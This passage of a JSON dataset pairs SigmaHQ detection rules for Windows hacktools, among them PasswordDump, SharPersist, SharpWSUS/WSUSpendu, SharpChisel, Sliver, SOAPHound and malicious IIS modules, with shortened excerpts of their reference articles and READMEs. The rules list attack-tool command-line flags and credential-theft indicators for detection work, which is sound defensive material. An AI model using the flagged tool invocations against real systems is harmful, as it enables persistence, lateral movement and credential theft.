      "author": "Florian Roth (Nextron Systems)",
      "date": "2018-12-19",
      "modified": "2023-02-04",
      "tags": [
        "attack.credential-access",
        "attack.t1555"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Company": "SecurityXploded"
          },
          {
            "Image|endswith": "PasswordDump.exe"
          },
          {
            "OriginalFileName|endswith": "PasswordDump.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_secutyxploded.yml"
  },
  "226": {
    "url": "https://web.archive.org/web/20200601000524/https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/",
    "markdown": "",
    "sigma_rule": {
      "title": "HackTool - SecurityXploded Execution",
      "id": "7679d464-4f74-45e2-9e01-ac66c5eb041a",
      "status": "stable",
      "description": "Detects the execution of SecurityXploded Tools",
      "references": [
        "https://securityxploded.com/",
        "https://web.archive.org/web/20200601000524/https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2018-12-19",
      "modified": "2023-02-04",
      "tags": [
        "attack.credential-access",
        "attack.t1555"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Company": "SecurityXploded"
          },
          {
            "Image|endswith": "PasswordDump.exe"
          },
          {
            "OriginalFileName|endswith": "PasswordDump.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_secutyxploded.yml"
  },
  "227": {
    "url": "https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit",
    "markdown": "# SharPersist: Windows Persistence Toolkit in C# **September 3, 2019** --- ### Written by: Brett Hawkins --- ## Background PowerShell has been used by the offensive community for several years now, but recent advances in the defensive security industry are causing offensive toolkits to migrate from PowerShell to reflective C# to evade modern security products. Some of these advancements include Script Block Logging, Antimalware Scripting Interface (AMSI), and the development of signatures for malicious PowerShell activity by third-party security vendors. Several public C# toolkits such as Seatbelt, SharpUp, and SharpView have been released to assist with tasks in various phases",
    "sigma_rule": {
      "title": "HackTool - SharPersist Execution",
      "id": "26488ad0-f9fd-4536-876f-52fea846a2e4",
      "status": "test",
      "description": "Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms",
      "references": [
        "https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit",
        "https://github.com/mandiant/SharPersist"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-09-15",
      "modified": "2023-02-04",
      "tags": [
        "attack.persistence",
        "attack.t1053"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\SharPersist.exe"
          },
          {
            "Product": "SharPersist"
          }
        ],
        "selection_cli_1": {
          "CommandLine|contains": [
            " -t schtask -c ",
            " -t startupfolder -c "
          ]
        },
        "selection_cli_2": {
          "CommandLine|contains|all": [
            " -t reg -c ",
            " -m add"
          ]
        },
        "selection_cli_3": {
          "CommandLine|contains|all": [
            " -t service -c ",
            " -m add"
          ]
        },
        "selection_cli_4": {
          "CommandLine|contains|all": [
            " -t schtask -c ",
            " -m add"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sharpersist.yml"
  },
  "228": {
    "url": "https://github.com/mandiant/SharPersist",
    "markdown": "# SharPersist Windows persistence toolkit written in C#. **For detailed usage information on each technique, see the Wiki.** Author - Brett Hawkins (@h4wkst3r) ## Release - Public version 1.0.1 of SharPersist can be found in the Releases section ## Installation/Building ### Pre-Compiled - Use the pre-compiled binary in the Releases section ### Building Yourself Take the below steps to setup Visual Studio in order to compile the project yourself. This requires a couple of .NET libraries that can be installed from the NuGet package manager. #### Libraries Used The below 3rd party libraries are used in this project. | Library",
    "sigma_rule": {
      "title": "HackTool - SharPersist Execution",
      "id": "26488ad0-f9fd-4536-876f-52fea846a2e4",
      "status": "test",
      "description": "Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms",
      "references": [
        "https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit",
        "https://github.com/mandiant/SharPersist"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-09-15",
      "modified": "2023-02-04",
      "tags": [
        "attack.persistence",
        "attack.t1053"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\SharPersist.exe"
          },
          {
            "Product": "SharPersist"
          }
        ],
        "selection_cli_1": {
          "CommandLine|contains": [
            " -t schtask -c ",
            " -t startupfolder -c "
          ]
        },
        "selection_cli_2": {
          "CommandLine|contains|all": [
            " -t reg -c ",
            " -m add"
          ]
        },
        "selection_cli_3": {
          "CommandLine|contains|all": [
            " -t service -c ",
            " -m add"
          ]
        },
        "selection_cli_4": {
          "CommandLine|contains|all": [
            " -t schtask -c ",
            " -m add"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sharpersist.yml"
  },
  "229": {
    "url": "https://labs.nettitude.com/blog/introducing-sharpwsus/",
    "markdown": "# Introducing SharpWSUS **Date:** 05 May 2022 Today, we’re releasing a new tool called SharpWSUS. This is a continuation of existing WSUS attack tooling such as WSUSPendu and Thunder_Woosus. It brings their complete functionality to .NET, in a way that can be reliably and flexibly used through command and control (C2) channels, including through PoshC2. ## The Background to SharpWSUS During a recent red team engagement, a client wanted to see if a backup server could be compromised. The backup server was critical to the organisation and had consequently been the target of several rounds of red teaming and subsequent",
    "sigma_rule": {
      "title": "HackTool - SharpWSUS/WSUSpendu Execution",
      "id": "b0ce780f-10bd-496d-9067-066d23dc3aa5",
      "status": "experimental",
      "description": "Detects the execution of SharpWSUS or WSUSpendu, utilities that allow for lateral movement through WSUS.\nWindows Server Update Services (WSUS) is a critical component of Windows systems and is frequently configured in a way that allows an attacker to circumvent internal networking limitations.\n",
      "references": [
        "https://labs.nettitude.com/blog/introducing-sharpwsus/",
        "https://github.com/nettitude/SharpWSUS",
        "https://web.archive.org/web/20210512154016/https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1"
      ],
      "author": "@Kostastsale, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-07",
      "modified": "2024-08-23",
      "tags": [
        "attack.execution",
        "attack.lateral-movement",
        "attack.t1210"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_wsuspendu_inject": {
          "CommandLine|contains": " -Inject "
        },
        "selection_wsuspendu_payload": {
          "CommandLine|contains": [
            " -PayloadArgs ",
            " -PayloadFile "
          ]
        },
        "selection_sharpwsus_commands": {
          "CommandLine|contains": [
            " approve ",
            " create ",
            " check ",
            " delete "
          ]
        },
        "selection_sharpwsus_flags": {
          "CommandLine|contains": [
            " /payload:",
            " /payload=",
            " /updateid:",
            " /updateid="
          ]
        },
        "condition": "all of selection_wsuspendu_* or all of selection_sharpwsus_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sharpwsus_wsuspendu_execution.yml"
  },
  "230": {
    "url": "https://github.com/nettitude/SharpWSUS",
    "markdown": "# SharpWSUS SharpWSUS is a CSharp tool for lateral movement through WSUS. There is a corresponding blog (https://labs.nettitude.com/blog/introducing-sharpwsus/) which has more detailed information about the tooling, use case and detection. ## Credits Massive credit to the below resources that really did 90% of this for me. This tool is just an enhancement of the below for C2 reliability and flexibility. - https://github.com/AlsidOfficial/WSUSpendu - powershell tool for abusing WSUS - https://github.com/ThunderGunExpress/Thunder_Woosus - Csharp tool for abusing WSUS ## Help Menu ``` ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___||",
    "sigma_rule": {
      "title": "HackTool - SharpWSUS/WSUSpendu Execution",
      "id": "b0ce780f-10bd-496d-9067-066d23dc3aa5",
      "status": "experimental",
      "description": "Detects the execution of SharpWSUS or WSUSpendu, utilities that allow for lateral movement through WSUS.\nWindows Server Update Services (WSUS) is a critical component of Windows systems and is frequently configured in a way that allows an attacker to circumvent internal networking limitations.\n",
      "references": [
        "https://labs.nettitude.com/blog/introducing-sharpwsus/",
        "https://github.com/nettitude/SharpWSUS",
        "https://web.archive.org/web/20210512154016/https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1"
      ],
      "author": "@Kostastsale, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-07",
      "modified": "2024-08-23",
      "tags": [
        "attack.execution",
        "attack.lateral-movement",
        "attack.t1210"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_wsuspendu_inject": {
          "CommandLine|contains": " -Inject "
        },
        "selection_wsuspendu_payload": {
          "CommandLine|contains": [
            " -PayloadArgs ",
            " -PayloadFile "
          ]
        },
        "selection_sharpwsus_commands": {
          "CommandLine|contains": [
            " approve ",
            " create ",
            " check ",
            " delete "
          ]
        },
        "selection_sharpwsus_flags": {
          "CommandLine|contains": [
            " /payload:",
            " /payload=",
            " /updateid:",
            " /updateid="
          ]
        },
        "condition": "all of selection_wsuspendu_* or all of selection_sharpwsus_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sharpwsus_wsuspendu_execution.yml"
  },
  "231": {
    "url": "https://web.archive.org/web/20210512154016/https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1",
    "markdown": "# WSUSpendu / WSUSpendu.ps1 ``` <# .SYNOPSIS Inject a newly created update in WSUS Server, executing an arbitrary command on targeted WSUS clients. .DESCRIPTION This script injects a payload in WSUS server in order to be executed on a targeted computer. Execution policy needs to be configured to execute foreign script: Set-ExecutionPolicy -ExecutionPolicy unrestricted (or bypass) .NOTES Authors: Yves Le Provost (yves.le-provost@ssi.gouv.fr) & Romain Coltel (romain.coltel@alsid.com) TODO: * Remote PowerShell: upload the PayloadFile .PARAMETER PayloadFile File to be executed on the target. It MUST be signed (using Authenticode) by Microsoft or a trusted third-party. .PARAMETER PayloadArgs Arguments to pass to",
    "sigma_rule": {
      "title": "HackTool - SharpWSUS/WSUSpendu Execution",
      "id": "b0ce780f-10bd-496d-9067-066d23dc3aa5",
      "status": "experimental",
      "description": "Detects the execution of SharpWSUS or WSUSpendu, utilities that allow for lateral movement through WSUS.\nWindows Server Update Services (WSUS) is a critical component of Windows systems and is frequently configured in a way that allows an attacker to circumvent internal networking limitations.\n",
      "references": [
        "https://labs.nettitude.com/blog/introducing-sharpwsus/",
        "https://github.com/nettitude/SharpWSUS",
        "https://web.archive.org/web/20210512154016/https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1"
      ],
      "author": "@Kostastsale, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-07",
      "modified": "2024-08-23",
      "tags": [
        "attack.execution",
        "attack.lateral-movement",
        "attack.t1210"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_wsuspendu_inject": {
          "CommandLine|contains": " -Inject "
        },
        "selection_wsuspendu_payload": {
          "CommandLine|contains": [
            " -PayloadArgs ",
            " -PayloadFile "
          ]
        },
        "selection_sharpwsus_commands": {
          "CommandLine|contains": [
            " approve ",
            " create ",
            " check ",
            " delete "
          ]
        },
        "selection_sharpwsus_flags": {
          "CommandLine|contains": [
            " /payload:",
            " /payload=",
            " /updateid:",
            " /updateid="
          ]
        },
        "condition": "all of selection_wsuspendu_* or all of selection_sharpwsus_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sharpwsus_wsuspendu_execution.yml"
  },
  "232": {
    "url": "https://github.com/shantanu561993/SharpChisel",
    "markdown": "# shantanu561993 / SharpChisel ## Folders and Files - .vs/SharpChisel/v16 - Go - SharpChisel - packages - README.md - SharpChisel.sln ## README ### SharpChisel C# Wrapper of Chisel from https://github.com/jpillora/chisel ITS really hard to keep up with the update schedule of CHISEL.",
    "sigma_rule": {
      "title": "HackTool - SharpChisel Execution",
      "id": "cf93e05e-d798-4d9e-b522-b0248dc61eaf",
      "related": [
        {
          "id": "8b0e12da-d3c3-49db-bb4f-256703f380e5",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the Sharp Chisel via the commandline arguments",
      "references": [
        "https://github.com/shantanu561993/SharpChisel",
        "https://www.sentinelone.com/labs/wading-through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-actor/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-05",
      "modified": "2023-02-13",
      "tags": [
        "attack.command-and-control",
        "attack.t1090.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\SharpChisel.exe"
          },
          {
            "Product": "SharpChisel"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sharp_chisel.yml"
  },
  "233": {
    "url": "https://www.sentinelone.com/labs/wading-through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-actor/",
    "markdown": "# Wading Through Muddy Waters | Recent Activity of an Iranian State-Sponsored Threat Actor **Date:** January 12, 2022 **Category:** Advanced Persistent Threat ## Overview MuddyWater is commonly considered an Iranian state-sponsored threat actor but no further granularity has previously been available. As of January 12th, 2022, U.S. CyberCommand has attributed this activity to the Iranian Ministry of Intelligence (MOIS). While some cases allow for attribution hunches, or even fleshed out connections to handles and online personas, attribution to a particular government organization is often reserved to the kind of visibility only available to governments with a well-developed all-source and signals",
    "sigma_rule": {
      "title": "HackTool - SharpChisel Execution",
      "id": "cf93e05e-d798-4d9e-b522-b0248dc61eaf",
      "related": [
        {
          "id": "8b0e12da-d3c3-49db-bb4f-256703f380e5",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the Sharp Chisel via the commandline arguments",
      "references": [
        "https://github.com/shantanu561993/SharpChisel",
        "https://www.sentinelone.com/labs/wading-through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-actor/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-05",
      "modified": "2023-02-13",
      "tags": [
        "attack.command-and-control",
        "attack.t1090.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\SharpChisel.exe"
          },
          {
            "Product": "SharpChisel"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sharp_chisel.yml"
  },
  "234": {
    "url": "https://github.com/BishopFox/sliver/blob/79f2d48fcdfc2bee4713b78d431ea4b27f733f30/implant/sliver/shell/shell_windows.go#L36",
    "markdown": "# Sliver Implant Framework ``` package shell /* Sliver Implant Framework Copyright (C) 2019 Bishop Fox This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a",
    "sigma_rule": {
      "title": "HackTool - Sliver C2 Implant Activity Pattern",
      "id": "42333b2c-b425-441c-b70e-99404a17170f",
      "status": "test",
      "description": "Detects process activity patterns as seen being used by Sliver C2 framework implants",
      "references": [
        "https://github.com/BishopFox/sliver/blob/79f2d48fcdfc2bee4713b78d431ea4b27f733f30/implant/sliver/shell/shell_windows.go#L36",
        "https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)",
      "date": "2022-08-25",
      "modified": "2023-03-05",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": "-NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sliver_c2_execution_pattern.yml"
  },
  "235": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/",
    "markdown": "# Looking for the ‘Sliver’ lining: Hunting for emerging command-and-control frameworks **August 24, 2022** ## Introduction Microsoft has observed the Sliver command-and-control (C2) framework now being adopted and integrated in intrusion campaigns by nation-state threat actors, cybercrime groups directly supporting ransomware and extortion, and other threat actors to evade detection. We’ve seen these actors use Sliver with—or as a replacement for—Cobalt Strike. Given Cobalt Strike’s popularity as an attack tool, defenses against it have also improved over time. Sliver thus presents an attractive alternative for actors looking for a lesser-known toolset with a low barrier for entry. First made public",
    "sigma_rule": {
      "title": "HackTool - Sliver C2 Implant Activity Pattern",
      "id": "42333b2c-b425-441c-b70e-99404a17170f",
      "status": "test",
      "description": "Detects process activity patterns as seen being used by Sliver C2 framework implants",
      "references": [
        "https://github.com/BishopFox/sliver/blob/79f2d48fcdfc2bee4713b78d431ea4b27f733f30/implant/sliver/shell/shell_windows.go#L36",
        "https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)",
      "date": "2022-08-25",
      "modified": "2023-03-05",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": "-NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sliver_c2_execution_pattern.yml"
  },
  "236": {
    "url": "https://github.com/FalconForceTeam/SOAPHound",
    "markdown": "# FalconForceTeam / SOAPHoundPublic ## Folders and Files - ADWS - Enums - OutputTypes - Processors - Properties - .gitignore - ADWSUtils.cs - FodyWeavers.xml - LICENSE - Options.cs - Program.cs - README.md - SOAPHound.csproj - SOAPHound.sln - hDNSRecord.cs - packages.config - soaphound-logo.png ## README ### Description SOAPHound is a .NET data collector tool, which collects Active Directory data via the Active Directory Web Services (ADWS) protocol. SOAPHound is an alternative to a number of open source security tools which are commonly used to extract Active Directory data via LDAP protocol. SOAPHound is able to extract the same information without directly",
    "sigma_rule": {
      "title": "HackTool - SOAPHound Execution",
      "id": "e92a4287-e072-4a40-9739-370c106bb750",
      "status": "test",
      "description": "Detects the execution of SOAPHound, a .NET tool for collecting Active Directory data, using specific command-line arguments that may indicate an attempt to extract sensitive AD information.\n",
      "references": [
        "https://github.com/FalconForceTeam/SOAPHound",
        "https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c"
      ],
      "author": "@kostastsale",
      "date": "2024-01-26",
      "tags": [
        "attack.discovery",
        "attack.t1087"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_1": {
          "CommandLine|contains": [
            " --buildcache ",
            " --bhdump ",
            " --certdump ",
            " --dnsdump "
          ]
        },
        "selection_2": {
          "CommandLine|contains": [
            " -c ",
            " --cachefilename ",
            " -o ",
            " --outputdirectory"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_soaphound_execution.yml"
  },
  "237": {
    "url": "https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c",
    "markdown": "# SOAPHound — tool to collect Active Directory data via ADWS **Jan 26, 2024** --- ## TL;DR SOAPHound is a custom-developed .NET data collector tool which can be used to enumerate Active Directory environments via the Active Directory Web Services (ADWS) protocol. SOAPHound can be used as an alternative to a number of open source security tools which are commonly used to extract Active Directory data via the LDAP protocol. SOAPHound can extract the same information without directly communicating to the LDAP server. Instead, LDAP queries are wrapped within a series of SOAP messages, which are sent to the ADWS",
    "sigma_rule": {
      "title": "HackTool - SOAPHound Execution",
      "id": "e92a4287-e072-4a40-9739-370c106bb750",
      "status": "test",
      "description": "Detects the execution of SOAPHound, a .NET tool for collecting Active Directory data, using specific command-line arguments that may indicate an attempt to extract sensitive AD information.\n",
      "references": [
        "https://github.com/FalconForceTeam/SOAPHound",
        "https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c"
      ],
      "author": "@kostastsale",
      "date": "2024-01-26",
      "tags": [
        "attack.discovery",
        "attack.t1087"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_1": {
          "CommandLine|contains": [
            " --buildcache ",
            " --bhdump ",
            " --certdump ",
            " --dnsdump "
          ]
        },
        "selection_2": {
          "CommandLine|contains": [
            " -c ",
            " --cachefilename ",
            " -o ",
            " --outputdirectory"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_soaphound_execution.yml"
  },
  "238": {
    "url": "https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/",
    "markdown": "# OilRig uses RGDoor IIS Backdoor on Targets in the Middle East **Malware** **Published:** January 25, 2018 **Categories:** High Profile Threats, Malware, Nation-State Cyberattacks, Threat Research **Tags:** Middle East, OilRig, RGDoor, TwoFace ## Related Products - Advanced Threat Prevention - Advanced WildFire --- ### Summary While investigating files uploaded to a TwoFace webshell, Unit 42 discovered actors installing an Internet Information Services (IIS) backdoor called RGDoor. Our data suggests that actors have deployed the RGDoor backdoor on webservers belonging to eight Middle Eastern government organizations, as well as one financial and one educational institution. We believe the actors deploy RGDoor",
    "sigma_rule": {
      "title": "IIS Native-Code Module Command Line Installation",
      "id": "9465ddf4-f9e4-4ebd-8d98-702df3a93239",
      "status": "test",
      "description": "Detects suspicious IIS native-code module installations via command line",
      "references": [
        "https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/",
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2019-12-11",
      "modified": "2024-03-13",
      "tags": [
        "attack.persistence",
        "attack.t1505.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\appcmd.exe"
          },
          {
            "OriginalFileName": "appcmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "install",
            "module"
          ],
          "CommandLine|contains|windash": "-name:"
        },
        "filter_iis_setup": {
          "ParentImage": "C:\\Windows\\System32\\inetsrv\\iissetup.exe"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown as it may vary from organisation to organisation how admins use to install IIS modules"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_iis_appcmd_susp_module_install.yml"
  },
  "239": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
    "markdown": "# Malicious IIS extensions quietly open persistent backdoors into servers **Published on July 26, 2022** --- Attackers are increasingly leveraging Internet Information Services (IIS) extensions as covert backdoors into servers, which hide deep in target environments and provide a durable persistence mechanism for attackers. While prior research has been published on specific incidents and variants, little is generally known about how attackers leverage the IIS platform as a backdoor. Malicious IIS extensions are less frequently encountered in attacks against servers, with attackers often only using script web shells as the first stage payload. This leads to a relatively lower detection",
    "sigma_rule": {
      "title": "IIS Native-Code Module Command Line Installation",
      "id": "9465ddf4-f9e4-4ebd-8d98-702df3a93239",
      "status": "test",
      "description": "Detects suspicious IIS native-code module installations via command line",
      "references": [
        "https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/",
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2019-12-11",
      "modified": "2024-03-13",
      "tags": [
        "attack.persistence",
        "attack.t1505.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\appcmd.exe"
          },
          {
            "OriginalFileName": "appcmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "install",
            "module"
          ],
          "CommandLine|contains|windash": "-name:"
        },
        "filter_iis_setup": {
          "ParentImage": "C:\\Windows\\System32\\inetsrv\\iissetup.exe"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown as it may vary from organisation to organisation how admins use to install IIS modules"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_iis_appcmd_susp_module_install.yml"
  },
  "240": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
    "markdown": "# Malicious IIS extensions quietly open persistent backdoors into servers **Published on July 26, 2022** --- Attackers are increasingly leveraging Internet Information Services (IIS) extensions as covert backdoors into servers, which hide deep in target environments and provide a durable persistence mechanism for attackers. While prior research has been published on specific incidents and variants, little is generally known about how attackers leverage the IIS platform as a backdoor. Malicious IIS extensions are less frequently encountered in attacks against servers, with attackers often only using script web shells as the first stage payload. This leads to a relatively lower detection",
    "sigma_rule": {
      "title": "Suspicious IIS Module Registration",
      "id": "043c4b8b-3a54-4780-9682-081cb6b8185c",
      "status": "test",
      "description": "Detects a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/"
      ],
      "author": "Florian Roth (Nextron Systems), Microsoft (idea)",
      "date": "2022-08-04",
      "modified": "2023-01-23",
      "tags": [
        "attack.persistence",
        "attack.t1505.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\w3wp.exe"
        },
        "selection_cli_1": {
          "CommandLine|contains": "appcmd.exe add module"
        },
        "selection_cli_2": {
          "CommandLine|contains": " system.enterpriseservices.internal.publish",
          "Image|endswith": "\\powershell.exe"
        },
        "selection_cli_3": {
          "CommandLine|contains|all": [
            "gacutil",
            " /I"
          ]
        },
        "condition": "selection_parent and 1 of selection_cli_*"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_iis_susp_module_registration.yml"
  },
  "241": {
    "url": "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
    "markdown": "# BumbleBee: Round Two **Categories:** adfind, bumblebee, cobaltstrike, Meterpreter **Published on:** September 26, 2022 In this intrusion from May 2022, the threat actors used BumbleBee as the initial access vector. BumbleBee has been identified as an initial access vector utilized by several ransomware affiliates. In this intrusion, we see the threat actor use BumbleBee to deploy Cobalt Strike and Meterpreter. The threat actor then used RDP and SMB to move around the network looking at backup systems and file shares before being evicted from the network. ## Case Summary The intrusion began with the delivery of an ISO file containing",
    "sigma_rule": {
      "title": "ImagingDevices Unusual Parent/Child Processes",
      "id": "f11f2808-adb4-46c0-802a-8660db50fa99",
      "status": "test",
      "description": "Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity",
      "references": [
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-27",
      "modified": "2022-12-29",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": [
            "\\WmiPrvSE.exe",
            "\\svchost.exe",
            "\\dllhost.exe"
          ],
